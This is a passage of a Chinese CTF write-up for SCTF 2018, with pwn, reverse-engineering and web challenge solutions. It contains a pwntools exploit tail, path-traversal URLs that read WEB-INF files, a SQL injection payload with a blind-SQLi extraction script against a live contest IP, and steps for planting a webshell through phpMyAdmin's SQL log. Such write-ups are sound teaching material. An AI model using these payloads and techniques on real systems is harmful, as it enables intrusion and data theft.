class="string">'\n'</span>))</span><br><span class="line">ru(<span class="string">'&gt;'</span>)</span><br><span class="line">print(addr)</span><br><span class="line"></span><br><span class="line">se(<span class="string">'Save'</span>)</span><br><span class="line">data=ru(<span class="string">'\n'</span>)</span><br><span class="line">idx=data[<span class="number">1</span>:].index(<span class="string">'-'</span>)</span><br><span class="line">t=<span class="number">0x100000000</span></span><br><span class="line">d1=int(data[:idx+<span class="number">1</span>])</span><br><span class="line">d2=int(data[idx+<span class="number">2</span>:])</span><br><span class="line">d1=(d1+<span class="number">0x100000000</span>)&amp;<span class="number">0xffffffff</span></span><br><span class="line">d2=(d2+<span class="number">0x100000000</span>)&amp;<span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line">print(hex(d1),d2)</span><br><span class="line"></span><br><span class="line">data=[]</span><br><span class="line">ru(<span class="string">'&gt;'</span>)</span><br><span class="line"></span><br><span class="line">t1=u32(get_addr_data(d1)[<span class="number">4</span>:])</span><br><span class="line">t2=u32(get_addr_data(d2)[<span class="number">4</span>:])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">write_data(d1+<span class="number">4</span>,t2<span class="number">-0x100000000</span>)</span><br><span class="line"></span><br><span class="line">se(<span class="string">'showinfo'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>flag:sctf{UnSafe_I5_Really_UnsAfe}</code></p>
</blockquote>
<h1 id="0x03-Reverse"><a href="#0x03-Reverse" class="headerlink" title="0x03 Reverse"></a>0x03 Reverse</h1><h2 id="script-in-script"><a href="#script-in-script" class="headerlink" title="script in script"></a>script in script</h2><p>动态生成了一些函数,下断点就能拿到:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params">r</span>) </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> D(~r, <span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">D</span>(<span class="params">r, n</span>) </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> n ? D(r ^ n, (r &amp; n) &lt;&lt; <span class="number">1</span>) : r</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">E</span>(<span class="params">r, n</span>) </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> D(r, a(n))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">F</span>(<span class="params">r, n</span>) </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> a = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span> (n) &#123;</span><br><span class="line">		<span class="keyword">if</span> (n &amp; <span class="number">1</span>) &#123;</span><br><span class="line">			a = D(a, r)</span><br><span class="line">		&#125;</span><br><span class="line">		r = r &lt;&lt; <span class="number">1</span>;</span><br><span class="line">		n = n &gt;&gt; <span class="number">1</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">G</span>(<span class="params">r, n</span>) </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> a = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span> (r &gt;= n) &#123;</span><br><span class="line">		r = E(r, n);</span><br><span class="line">		a = D(a, <span class="number">1</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">H</span>(<span class="params">r</span>) </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> r.length</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">J</span>(<span class="params">r, n</span>) </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> !(r ^ n)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">K</span>(<span class="params">r, n</span>) </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> r[n]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">L</span>(<span class="params">r</span>) </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (r.length == <span class="number">1</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> r.charCodeAt(<span class="number">0</span>)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">M</span>(<span class="params">r</span>) </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> +r</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">N</span>(<span class="params">r</span>) </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">String</span>(r)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Q</span>(<span class="params">r, n, a, v</span>) </span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">var</span> t = r; t &lt;= n; t++) &#123;</span><br><span class="line">		<span class="keyword">if</span> (a[t] != v[t - r]) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>主验证函数:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">r</span>(<span class="params">r</span>) </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> n = r;</span><br><span class="line">	<span class="keyword">var</span> a = H(n); <span class="comment">//返回n长度</span></span><br><span class="line">	<span class="keyword">var</span> v = J(a, <span class="number">24</span>); <span class="comment">//n长度为24</span></span><br><span class="line">	<span class="keyword">var</span> t = K(n, <span class="number">0</span>);  <span class="comment">//s</span></span><br><span class="line">	<span class="keyword">var</span> u = K(n, <span class="number">1</span>);  <span class="comment">//c</span></span><br><span class="line">	<span class="keyword">var</span> i = K(n, <span class="number">2</span>);  <span class="comment">//t</span></span><br><span class="line">	<span class="keyword">var</span> e = K(n, <span class="number">3</span>); <span class="comment">//取n前四位 赋值到t u i e</span></span><br><span class="line">	<span class="keyword">var</span> f = D(L(t), L(i)); <span class="comment">//f为231  </span></span><br><span class="line">	<span class="keyword">var</span> o = E(L(t), L(u)); <span class="comment">//o为16</span></span><br><span class="line">	<span class="keyword">var</span> c = K(n, <span class="number">6</span>);</span><br><span class="line">	<span class="keyword">var</span> l = K(n, <span class="number">7</span>);</span><br><span class="line">	<span class="keyword">var</span> h = K(n, <span class="number">16</span>);</span><br><span class="line">	<span class="keyword">var</span> w = K(n, <span class="number">17</span>); <span class="comment">//取n 7 8 17 18位 赋值到c l h w</span></span><br><span class="line">	<span class="keyword">var</span> I = J(E(L(u), L(h)), <span class="number">0</span>); <span class="comment">//E(L(u), L(h)) == 0</span></span><br><span class="line">	<span class="keyword">var</span> S = J(D(L(c), L(l)), D(L(h), L(w))); <span class="comment">//D(L(c), L(l)) == D(L(h), L(w))</span></span><br><span class="line">	<span class="keyword">var</span> _ = J(E(L(u), L(c)), <span class="number">0</span>); <span class="comment">//E(L(u), L(c)) == 0</span></span><br><span class="line">	<span class="keyword">var</span> g = K(n, <span class="number">21</span>);</span><br><span class="line">	<span class="keyword">var</span> p = K(n, <span class="number">22</span>); <span class="comment">//取n 22 23 位 赋值到g p</span></span><br><span class="line">	<span class="keyword">var</span> s = J(E(F(L(g), <span class="number">2</span>), <span class="number">2</span>), <span class="number">64</span>);</span><br><span class="line">	<span class="keyword">var</span> P = Q(<span class="number">9</span>, <span class="number">15</span>, n, <span class="string">"Pt_In_S"</span>); <span class="comment">//9-15为Pt_In_S</span></span><br><span class="line">	<span class="keyword">var</span> T = J(L(l), L(<span class="string">"r"</span>));</span><br><span class="line">	<span class="keyword">var</span> b = J(f, <span class="number">231</span>);</span><br><span class="line">	<span class="keyword">var</span> d = J(o, <span class="number">16</span>);</span><br><span class="line">	<span class="keyword">var</span> j = M(K(n, <span class="number">5</span>));</span><br><span class="line">	<span class="keyword">var</span> k = J(G(M(O(N(L(e)), <span class="string">"0"</span>)), j), <span class="number">204</span>);</span><br><span class="line">	<span class="keyword">var</span> m = M(K(n, <span class="number">8</span>));</span><br><span class="line">	<span class="keyword">var</span> q = Q(<span class="number">18</span>, <span class="number">20</span>, n, <span class="string">"IpT"</span>); <span class="comment">//18-20为IpT</span></span><br><span class="line">	<span class="keyword">var</span> x = J(E(j, m), <span class="number">4</span>);</span><br><span class="line">	<span class="keyword">var</span> y = J(F(m, m), m);</span><br><span class="line">	<span class="keyword">var</span> z = J(D(L(K(n, <span class="number">4</span>)), <span class="number">2</span>), <span class="number">125</span>);</span><br><span class="line">	<span class="keyword">var</span> A = J(L(u), <span class="number">99</span>); <span class="comment">//u是 ‘c’ !!!!!!!!!....</span></span><br><span class="line">	<span class="keyword">var</span> B = J(L(n[<span class="number">23</span>]), <span class="number">125</span>);</span><br><span class="line">	<span class="keyword">var</span> C = J(L(n[<span class="number">22</span>]), <span class="number">33</span>);</span><br><span class="line">	<span class="keyword">return</span> v &amp;&amp; I &amp;&amp; S &amp;&amp; _ &amp;&amp; s &amp;&amp; P &amp;&amp; T &amp;&amp; b &amp;&amp; d &amp;&amp; k &amp;&amp; q &amp;&amp; x &amp;&amp; y &amp;&amp; z &amp;&amp; A &amp;&amp; B &amp;&amp; C</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>flag:sctf{5cr1Pt_In_ScrIpT!!}</code></p>
</blockquote>
<h2 id="Where-is-my-13th-count？"><a href="#Where-is-my-13th-count？" class="headerlink" title="Where is my 13th count？"></a>Where is my 13th count？</h2><p>反编译 <code>.\Cheat Engine_Data\Managed\Assembly-CSharp.dll</code>, 修改PlayerController.SetCountText中的判断条件, 使吃到一个的时候就移动地面, 即可看到flag.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">private void SetCountText()</span><br><span class="line">&#123;</span><br><span class="line">	this.countText.text = &quot;Count: &quot; + this.count.ToString();</span><br><span class="line">	if (this.count &gt;= 14) // 改为if (this.count &gt;= 1)</span><br><span class="line">	&#123;</span><br><span class="line">		this.winText.text = &quot;Don&apos;t Eat Your Flag!&quot;;</span><br><span class="line">		this.floor.transform.position = new Vector3(this.floor.transform.position.x, this.floor.transform.position.y - 2f, this.floor.transform.position.z);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>flag: SCTF{ThEFLAGGGGGGG}</code></p>
</blockquote>
<h2 id="Babymips"><a href="#Babymips" class="headerlink" title="Babymips"></a>Babymips</h2><p>输入长度38, 先逐字节与下标加1异或, 然后取[5:37]先异或0x30, 再异或<code>[0x73, 0x63, 0x74, 0x66][(i-5) % 4]</code>.</p>
<p>解密<code>sub_400B3C</code>, 长度0x1D8, 代码解密脚本:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">f = open(<span class="string">"data"</span>,<span class="string">"rb"</span>)</span><br><span class="line">data = f.read()</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">code = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, len(data)):</span><br><span class="line">    v = ord(data[i])</span><br><span class="line">    vv = <span class="number">0</span></span><br><span class="line">    <span class="comment"># flip bits</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">0</span>, <span class="number">8</span>):</span><br><span class="line">        k = v &amp; (<span class="number">1</span> &lt;&lt; j)</span><br><span class="line">        k &gt;&gt;= j</span><br><span class="line">        k &lt;&lt;= <span class="number">7</span>-j</span><br><span class="line">        vv |= k</span><br><span class="line">    code+=chr(vv)</span><br><span class="line"></span><br><span class="line">f = open(<span class="string">"code"</span>,<span class="string">"wb"</span>)</span><br><span class="line">f.write(code)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
<p>flag解密脚本:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># byte_412038</span></span><br><span class="line">a = \</span><br><span class="line">[</span><br><span class="line">    <span class="number">0x72</span>, <span class="number">0x61</span>, <span class="number">0x77</span>, <span class="number">0x62</span>, <span class="number">0x7E</span>, <span class="number">0x07</span>, <span class="number">0x35</span>, <span class="number">0x2E</span>, </span><br><span class="line">    <span class="number">0x26</span>, <span class="number">0x24</span>, <span class="number">0x31</span>, <span class="number">0x38</span>, <span class="number">0x28</span>, <span class="number">0x12</span>, <span class="number">0x35</span>, <span class="number">0x07</span>, </span><br><span class="line">    <span class="number">0x18</span>, <span class="number">0x22</span>, <span class="number">0x2F</span>, <span class="number">0x0F</span>, <span class="number">0x26</span>, <span class="number">0x34</span>, <span class="number">0x71</span>, <span class="number">0x25</span>, </span><br><span class="line">    <span class="number">0x10</span>, <span class="number">0x20</span>, <span class="number">0x27</span>, <span class="number">0x37</span>, <span class="number">0x24</span>, <span class="number">0x32</span>, <span class="number">0x23</span>, <span class="number">0x0B</span>, </span><br><span class="line">    <span class="number">0x18</span>, <span class="number">0x0E</span>, <span class="number">0x1F</span>, <span class="number">0x0F</span>, <span class="number">0x52</span>, <span class="number">0x5B</span></span><br><span class="line">]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, <span class="number">38</span>):</span><br><span class="line">    a[i] ^= i+<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">5</span>, <span class="number">37</span>):</span><br><span class="line">    a[i] ^= <span class="number">0x30</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">5</span>, <span class="number">37</span>):</span><br><span class="line">    a[i] ^= [<span class="number">0x73</span>, <span class="number">0x63</span>, <span class="number">0x74</span>, <span class="number">0x66</span>][(i<span class="number">-5</span>) % <span class="number">4</span>]</span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, <span class="number">38</span>):</span><br><span class="line">    flag+=chr(a[i])</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>flag: sctf{Babymips_iS_so_ea5y_yoooooooooo!}</code></p>
</blockquote>
<h2 id="crackme2"><a href="#crackme2" class="headerlink" title="crackme2"></a>crackme2</h2><p>fork进程用断点通信, 子进程 <code>sub_3E74</code> 解密, 父进程<code>sub_3940</code>比较. 用链表保存字符串”We1co3t0lmel2eV”, ptrace到断点时取子进程r0寄存器比较. </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">key = [<span class="number">0xEF</span>, <span class="number">0x145</span>, <span class="number">0x93</span>, <span class="number">0x134</span>, <span class="number">0x132</span>]</span><br><span class="line">secret = [ord(c) <span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">"We1co3t0lmel2eV"</span>]</span><br><span class="line">a = \</span><br><span class="line">[</span><br><span class="line">    [(key[i] - secret[<span class="number">0</span>  + i]) <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, <span class="number">5</span>)],</span><br><span class="line">    [(key[i] - secret[<span class="number">5</span>  + i]) <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, <span class="number">5</span>)],</span><br><span class="line">    [(key[i] - secret[<span class="number">10</span> + i]) <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, <span class="number">5</span>)],</span><br><span class="line">]</span><br><span class="line">flag = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, <span class="number">15</span>)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, <span class="number">5</span>):</span><br><span class="line">    v = (a[<span class="number">0</span>][i] + a[<span class="number">1</span>][i] + a[<span class="number">2</span>][i]) / <span class="number">2</span></span><br><span class="line">    flag[<span class="number">0</span> + i] = v - a[<span class="number">0</span>][i]</span><br><span class="line">    flag[<span class="number">5</span> + (i + <span class="number">1</span>) % <span class="number">5</span>] = v - a[<span class="number">1</span>][i]</span><br><span class="line">    flag[<span class="number">10</span> + (i + <span class="number">2</span>) % <span class="number">5</span>] = v - a[<span class="number">2</span>][i]</span><br><span class="line">s = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, <span class="number">15</span>):</span><br><span class="line">    s += chr(flag[i])</span><br><span class="line"><span class="keyword">print</span> s</span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>flag: We1com3t0leVel2</code></p>
</blockquote>
<h2 id="simple"><a href="#simple" class="headerlink" title="simple"></a>simple</h2><p>test.zip用rc4解密得到dex文件. 反编译后抠代码穷举每组符合条件的字符.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">53 5</span><br><span class="line">55 7</span><br><span class="line">61 =</span><br><span class="line">63 ?</span><br><span class="line">85 U</span><br><span class="line">87 W</span><br><span class="line">93 ]</span><br><span class="line">95 _</span><br><span class="line">117 u</span><br><span class="line">119 w</span><br><span class="line">125 &#125;</span><br><span class="line">-------------------</span><br><span class="line">81 Q</span><br><span class="line">83 S</span><br><span class="line">85 U</span><br><span class="line">87 W</span><br><span class="line">89 Y</span><br><span class="line">91 [</span><br><span class="line">93 ]</span><br><span class="line">95 _</span><br><span class="line">113 q</span><br><span class="line">115 s</span><br><span class="line">117 u</span><br><span class="line">119 w</span><br><span class="line">121 y</span><br><span class="line">123 &#123;</span><br><span class="line">125 &#125;</span><br><span class="line">-------------------</span><br><span class="line">57 9</span><br><span class="line">59 ;</span><br><span class="line">61 =</span><br><span class="line">63 ?</span><br><span class="line">89 Y</span><br><span class="line">91 [</span><br><span class="line">93 ]</span><br><span class="line">95 _</span><br><span class="line">121 y</span><br><span class="line">123 &#123;</span><br><span class="line">125 &#125;</span><br></pre></td></tr></table></figure>
<p>每组取前八个字符即为flag.</p>
<blockquote>
<p><code>flag: SCTF{57=?UW]_QSUWY[]_9;=?Y[]_}</code></p>
</blockquote>
<h1 id="0x04-Web"><a href="#0x04-Web" class="headerlink" title="0x04 Web"></a>0x04 Web</h1><h2 id="Zhuanxv"><a href="#Zhuanxv" class="headerlink" title="Zhuanxv"></a>Zhuanxv</h2><p>通过报错知道服务器中间件是tomcat</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171312-7d0a5ee0-75fc-1.png" alt></p>
<p>80端口有apache默认页<br>github搜了一下发现后台登录页面 <a href="http://121.196.195.244:9032/zhuanxvlogin存在url" target="_blank" rel="noopener">http://121.196.195.244:9032/zhuanxvlogin存在url</a> <a href="http://121.196.195.244:9032/list" target="_blank" rel="noopener">http://121.196.195.244:9032/list</a> </p>
<p><a href="http://121.196.195.244:9032/loadimage?fileName=web_login_bg.jpg" target="_blank" rel="noopener">http://121.196.195.244:9032/loadimage?fileName=web_login_bg.jpg</a><br>⬆️这个url极其可疑,下载的文件竟然是bg.jpg</p>
<p>下载javaweb配置文件，发现是struts2项目 <a href="http://121.196.195.244:9032/loadimage?fileName=../../WEB-INF/web.xml" target="_blank" rel="noopener">http://121.196.195.244:9032/loadimage?fileName=../../WEB-INF/web.xml</a></p>
<p>下载struts2配置文件 <a href="http://121.196.195.244:9032/loadimage?fileName=../../WEB-INF/classes/struts.xml" target="_blank" rel="noopener">http://121.196.195.244:9032/loadimage?fileName=../../WEB-INF/classes/struts.xml</a></p>
<p>用 <a href="http://121.196.195.244:9032/loadimage?fileName=../../WEB-INF/classes/com/xxxxxxx.class" target="_blank" rel="noopener">http://121.196.195.244:9032/loadimage?fileName=../../WEB-INF/classes/com/xxxxxxx.class</a><br>读取java编译后的文件并反编译得到源码<br>读取登陆部分的逻辑源码发现过滤不严格加上拼接参数，存在注入</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171312-7d2241b8-75fc-1.png" alt></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171312-7d3fdc00-75fc-1.png" alt></p>
<p>构造payload如下<br>/zhuanxvlogin?user.name=admin%27%0Aor%0A%271%27%3E%270’%0Aor%0Aname%0Alike%0A’admin&amp;user.password=1</p>
<p>结合前面读取到的adminaction类可以列目录<br><a href="http://121.196.195.244:9032/list?pathName=/opt/tomcat/webapps/ROOT/WEB-INF/classes/com/cuitctf/po" target="_blank" rel="noopener">http://121.196.195.244:9032/list?pathName=/opt/tomcat/webapps/ROOT/WEB-INF/classes/com/cuitctf/po</a><br>读取WEB-INF/classes/com/cuitctf/po/Flag.class<br>反编译后是个flag的映射类，感觉flag在数据库中，读取cfg.xml映射文件，确定flag在数据库中</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171312-7d4eb32e-75fc-1.png" alt></p>
<p>构造盲注脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s=requests.session()</span><br><span class="line"></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    p=<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">255</span>):</span><br><span class="line">  payload=<span class="string">"(select%0Aascii(substr(id,"</span>+str(i)+<span class="string">",1))%0Afrom%0AFlag%0Awhere%0Aid&lt;2)&lt;'"</span>+str(j)+<span class="string">"'"</span></span><br><span class="line">        <span class="comment">#print payload</span></span><br><span class="line">        url=<span class="string">"http://121.196.195.244:9032/zhuanxvlogin?user.name=admin'%0Aor%0A"</span>+payload+<span class="string">"%0Aor%0Aname%0Alike%0A'admin&amp;user.password=1"</span></span><br><span class="line">        r1=s.get(url)</span><br><span class="line">        <span class="comment">#print url</span></span><br><span class="line">        <span class="comment">#print len(r1.text)</span></span><br><span class="line">        <span class="keyword">if</span> len(r1.text)&gt;<span class="number">20000</span> <span class="keyword">and</span> p!=<span class="string">''</span>:</span><br><span class="line">            flag+=p</span><br><span class="line">            <span class="keyword">print</span> i,flag</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        p=chr(j)</span><br></pre></td></tr></table></figure>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171313-7d787fec-75fc-1.png" alt></p>
<blockquote>
<p><code>flag:sctf{C46E250926A2DFFD83197539622B08E}</code></p>
</blockquote>
<h2 id="easiest-web-phpmyadmin"><a href="#easiest-web-phpmyadmin" class="headerlink" title="easiest web - phpmyadmin"></a>easiest web - phpmyadmin</h2><p>账号密码都是root<br>顺手把密码改成HackMe1n<br>估计是被发现了 被改回去了…不知道啥密码<br>开了3389,系统是windows<br>通过报错爆www路径：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171313-7d8b6634-75fc-1.png" alt></p>
<p>直接写文件写不了<br>通过sql日志文件写shell</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171313-7da06d54-75fc-1.png" alt></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171313-7dafe018-75fc-1.png" alt></p>
<p>菜刀连上去：<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171313-7dba084a-75fc-1.png" alt></p>
<blockquote>
<p><code>flag:sctf{31cf2213cc49605a30f07395d6e5b9c4}</code></p>
</blockquote>
<h2 id="BabySyc-Simple-PHP-Web"><a href="#BabySyc-Simple-PHP-Web" class="headerlink" title="BabySyc - Simple PHP Web"></a>BabySyc - Simple PHP Web</h2><p>这题是比赛结束后才做出来的</p>
